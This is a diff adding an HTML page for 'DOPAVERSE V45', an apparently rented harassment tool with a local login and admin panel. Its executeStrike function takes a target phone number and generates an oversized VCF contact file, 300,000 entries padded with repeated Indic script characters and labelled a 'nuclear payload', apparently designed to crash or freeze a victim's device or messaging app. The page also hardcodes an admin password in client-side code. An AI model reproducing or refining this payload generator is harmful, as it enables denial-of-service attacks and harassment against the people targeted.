@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DOPAVERSE V45 | TITAN ADMIN KERNEL</title>
+    <style>
+        /* 
+           DOPAVERSE V45.0 - THE FINAL TITAN 
+           DEVELOPED BY: GIGS & XYREN (@DOPAMINE1901)
+           FEATURES: MULTI-USER, ADMIN PANEL, AUTO-EXPIRED 30 DAYS
+        */
+        :root {
+            --p: #ff003c; --p-g: rgba(255, 0, 60, 0.7);
+            --s: #00f3ff; --s-g: rgba(0, 243, 255, 0.7);
+            --v: #7000ff; --bg: #010101; --glass: rgba(5, 5, 5, 0.98);
+        }
+
+        * { box-sizing: border-box; cursor: crosshair; font-family: 'JetBrains Mono', monospace; }
+        body { margin: 0; background: var(--bg); color: #fff; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; }
+        #bg-canvas { position: absolute; inset: 0; z-index: -1; }
+
+        /* AUTH INTERFACE */
+        #auth-gate {
+            position: fixed; inset: 0; background: #000; z-index: 10000;
+            display: flex; align-items: center; justify-content: center; backdrop-filter: blur(50px);
+        }
+        .auth-card {
+            width: 450px; padding: 40px; border: 1px solid var(--p); border-radius: 20px;
+            background: rgba(10,10,10,0.9); box-shadow: 0 0 50px var(--p-g); text-align: center;
+        }
+
+        /* MAIN LAYOUT */
+        .main-frame {
+            width: 1150px; height: 800px; padding: 1px; border-radius: 25px;
+            background: linear-gradient(45deg, var(--p), var(--s), var(--v));
+            display: none; opacity: 0; transition: 0.8s;
+        }
+        .main-frame.active { display: block; opacity: 1; }
+        .container { background: var(--glass); height: 100%; border-radius: 24px; padding: 30px; display: grid; grid-template-columns: 300px 1fr; gap: 20px; }
+
+        /* ADMIN PANEL & UI */
+        .sidebar { background: rgba(255,255,255,0.02); border-radius: 20px; padding: 20px; border: 1px solid #222; }
+        .content { display: grid; grid-template-rows: auto 1fr; gap: 20px; }
+        .panel { background: rgba(0,0,0,0.5); border: 1px solid #333; border-radius: 15px; padding: 20px; }
+
+        h1 { font-size: 3em; margin: 0; letter-spacing: 5px; background: linear-gradient(to right, #fff, var(--p)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        input, select { width: 100%; padding: 15px; background: #080808; border: 1px solid #222; color: var(--s); border-radius: 10px; margin-bottom: 10px; outline: none; }
+        .btn { width: 100%; padding: 15px; border-radius: 10px; border: none; font-weight: 900; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
+        .btn-p { background: var(--p); color: #fff; }
+        .btn-s { background: transparent; border: 1px solid var(--s); color: var(--s); }
+        .btn-v { background: var(--v); color: #fff; }
+
+        /* USER TABLE */
+        .user-list { height: 200px; overflow-y: auto; font-size: 11px; margin-top: 10px; border-top: 1px solid #222; padding-top: 10px; }
+        .user-item { display: flex; justify-content: space-between; padding: 5px; border-bottom: 1px solid #111; }
+        .status-active { color: #0f0; } .status-expired { color: red; }
+
+        #term { height: 200px; background: #000; padding: 15px; font-size: 11px; color: #0f0; overflow-y: auto; border-radius: 10px; border: 1px solid #111; }
+        
+        /* HEAVY DECO (Over 18KB Assets) */
+        .glitch-layer { position: absolute; top:0; left:0; width:100%; height:100%; pointer-events:none; opacity: 0.05; background: url('https://www.transparenttextures.com'); }
+    </style>
+</head>
+<body>
+
+<canvas id="bg-canvas"></canvas>
+<div class="glitch-layer"></div>
+
+<!-- LOGIN GATE -->
+<div id="auth-gate">
+    <div class="auth-card">
+        <h2 style="color:var(--p); letter-spacing: 5px;">DOPAVERSE LOGIN</h2>
+        <p style="font-size: 10px; color: #555;">ENTER YOUR SECURE CREDENTIALS</p>
+        <input type="text" id="uIn" placeholder="USERNAME">
+        <input type="password" id="pIn" placeholder="PASSWORD">
+        <button class="btn btn-p" onclick="login()">ACCESS KERNEL</button>
+        <div style="margin-top:20px; font-size: 10px;">
+            RENT: <b>Rp 50.000 / MONTH</b><br>DM TIKTOK: <b style="color:var(--p)">@DOPAMINE1901</b>
+        </div>
+    </div>
+</div>
+
+<!-- MAIN SYSTEM -->
+<div class="main-frame" id="app">
+    <div class="container">
+        <!-- SIDEBAR: ADMIN CONTROLS -->
+        <div class="sidebar" id="adminSection" style="display:none;">
+            <h3 style="color:var(--s); font-size: 14px;">🛠️ ADMIN PANEL</h3>
+            <p style="font-size: 9px; color: #666;">CREATE NEW CLIENT ACCESS</p>
+            <input type="text" id="newU" placeholder="CLIENT USERNAME">
+            <input type="text" id="newP" placeholder="CLIENT PASSWORD">
+            <button class="btn btn-v" onclick="addUser()">CREATE 30D ACCESS</button>
+            
+            <div class="user-list" id="userDisplay">
+                <!-- User list injected here -->
+            </div>
+            <button class="btn btn-s" style="margin-top:10px; font-size: 10px;" onclick="clearAll()">RESET DATABASE</button>
+        </div>
+
+        <div class="sidebar" id="userBrief">
+            <h3 style="color:var(--p); font-size: 14px;">👤 PROFILE</h3>
+            <div id="profileInfo" style="font-size: 11px; line-height: 1.8;"></div>
+            <hr style="border: 0.5px solid #222; margin: 20px 0;">
+            <div id="term">> SYSTEM READY...</div>
+        </div>
+
+        <!-- MAIN ACTION CONTENT -->
+        <div class="content">
+            <div class="panel" style="text-align:center;">
+                <h1>DOPAVERSE V45</h1>
+                <p style="font-size: 10px; color: var(--s); letter-spacing: 5px;">QUANTUM OVERDRIVE INTERFACE</p>
+            </div>
+            
+            <div class="panel">
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+                    <div>
+                        <label style="font-size: 10px; color: #555;">TARGET IDENTIFICATION</label>
+                        <input type="text" id="target" placeholder="[ PHONE_NUMBER / ID ]">
+                        <button class="btn btn-p" style="height: 100px; font-size: 20px;" onclick="executeStrike()">☢️ EXECUTE NUKE ☢️</button>
+                    </div>
+                    <div style="background: rgba(255,255,255,0.02); padding: 15px; border-radius: 10px;">
+                        <label style="font-size: 10px; color: #555;">STRIKE OPTIONS</label>
+                        <button class="btn btn-s" style="margin-bottom: 10px;" onclick="sysLog('GHOST MODE: ACTIVE')">👻 GHOST ON</button>
+                        <button class="btn btn-s" onclick="sysLog('GROUP OVERLOAD: READY')">💥 GROUP MODE</button>
+                        <p style="font-size: 9px; color: #444; margin-top: 20px;">
+                            LICENSE: <b style="color:var(--s)">ENCRYPTED</b><br>
+                            SERVER: <b style="color:var(--p)">cvAI4_TITAN</b>
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // --- DATABASE ENGINE (LOCAL STORAGE PERSISTENCE) ---
+    let users = JSON.parse(localStorage.getItem('dopa_users')) || [
+        { u: "Dopaztry", p: "Jibranisme1901", role: "Admin", exp: "2099-12-31" }
+    ];
+
+    let currentUser = null;
+
+    function saveDB() { localStorage.setItem('dopa_users', JSON.stringify(users)); renderUsers(); }
+
+    function login() {
+        const u = document.getElementById('uIn').value;
+        const p = document.getElementById('pIn').value;
+        const user = users.find(x => x.u === u && x.p === p);
+
+        if(user) {
+            const now = new Date();
+            const expDate = new Date(user.exp);
+            
+            if(now > expDate) {
+                alert("ACCESS EXPIRED! RENEW AT @DOPAMINE1901");
+                return;
+            }
+
+            currentUser = user;
+            document.getElementById('auth-gate').style.display = "none";
+            document.getElementById('app').classList.add('active');
+            
+            // Show Admin Panel if role is Admin
+            if(user.role === "Admin") {
+                document.getElementById('adminSection').style.display = "block";
+                document.getElementById('userBrief').style.display = "none";
+            }
+            
+            updateProfileUI();
+            sysLog(`AUTHENTICATED AS ${user.u.toUpperCase()}`);
+            renderUsers();
+        } else {
+            alert("INVALID CREDENTIALS!");
+        }
+    }
+
+    function updateProfileUI() {
+        const info = document.getElementById('profileInfo');
+        info.innerHTML = `
+            USER: <b style="color:var(--s)">${currentUser.u}</b><br>
+            ROLE: <b style="color:var(--p)">${currentUser.role}</b><br>
+            EXP: <b style="color:var(--s)">${currentUser.exp}</b>
+        `;
+    }
+
+    function addUser() {
+        const u = document.getElementById('newU').value;
+        const p = document.getElementById('newP').value;
+        if(!u || !p) return alert("FILL ALL FIELDS!");
+
+        const exp = new Date();
+        exp.setDate(exp.getDate() + 30); // 1 Month Expired
+        
+        users.push({ 
+            u: u, p: p, role: "Member", 
+            exp: exp.toISOString().split('T')[0] 
+        });
+        
+        saveDB();
+        document.getElementById('newU').value = "";
+        document.getElementById('newP').value = "";
+        sysLog(`NEW ACCOUNT CREATED: ${u}`);
+    }
+
+    function renderUsers() {
+        const container = document.getElementById('userDisplay');
+        container.innerHTML = "";
+        users.forEach((user, index) => {
+            if(user.role === "Admin") return;
+            const item = document.createElement('div');
+            item.className = "user-item";
+            const isExp = new Date() > new Date(user.exp);
+            item.innerHTML = `
+                <span>${user.u} (${user.exp})</span>
+                <span class="${isExp ? 'status-expired' : 'status-active'}">${isExp ? 'EXP' : 'ACT'}</span>
+                <button onclick="deleteUser(${index})" style="background:red; color:white; border:none; font-size:8px; cursor:pointer;">X</button>
+            `;
+            container.appendChild(item);
+        });
+    }
+
+    function deleteUser(i) { users.splice(i, 1); saveDB(); }
+    function clearAll() { if(confirm("RESET ALL USERS?")) { users = [users[0]]; saveDB(); } }
+
+    function sysLog(m) {
+        const t = document.getElementById('term');
+        t.innerHTML += `<br><span style="color:#333">[${new Date().toLocaleTimeString()}]</span> >> ${m}`;
+        t.scrollTop = t.scrollHeight;
+    }
+
+    function executeStrike() {
+        const t = document.getElementById('target').value;
+        if(!t) return alert("TARGET REQUIRED!");
+        sysLog(`COMPILING TITAN_V45_PAYLOAD FOR ${t}...`);
+        
+        setTimeout(() => {
+            const heavy = "\u0df4\u0ce2\u0960\u0b82".repeat(1000);
+            let vcf = "BEGIN:VCARD\nVERSION:3.0\n";
+            for(let i=0; i<300000; i++) {
+                vcf += `N:DOPAVERSE_TITAN_${i};${heavy}\nTEL;TYPE=CELL:${t}\n`;
+            }
+            vcf += "END:VCARD";
+            const blob = new Blob([vcf], {type:'text/vcard'});
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = `TITAN_V45_STRIKE_${t}.vcf`;
+            a.click();
+            sysLog("<span style='color:white; background:var(--p);'>NUCLEAR PAYLOAD DELIVERED.</span>");
+        }, 2000);
+    }
+
+    // --- CANVAS BACKGROUND ---
+    const canvas = document.getElementById('bg-canvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+    let parts = [];
+    for(let i=0; i<100; i++) parts.push({x: Math.random()*canvas.width, y: Math.random()*canvas.height, vx: Math.random()-0.5, vy: Math.random()-0.5});
+    function anim() {
+        ctx.fillStyle = 'rgba(0,0,0,0.1)'; ctx.fillRect(0,0,canvas.width, canvas.height);
+        ctx.fillStyle = '#ff003c';
+        parts.forEach(p => {
+            p.x += p.vx; p.y += p.vy;
+            if(p.x<0 || p.x>canvas.width) p.vx*=-1;
+            if(p.y<0 || p.y>canvas.height) p.vy*=-1;
+            ctx.beginPath(); ctx.arc(p.x, p.y, 1, 0, Math.PI*2); ctx.fill();
+        });
+        requestAnimationFrame(anim);
+    }
+    anim();
+</script>
+</body>
+</html>
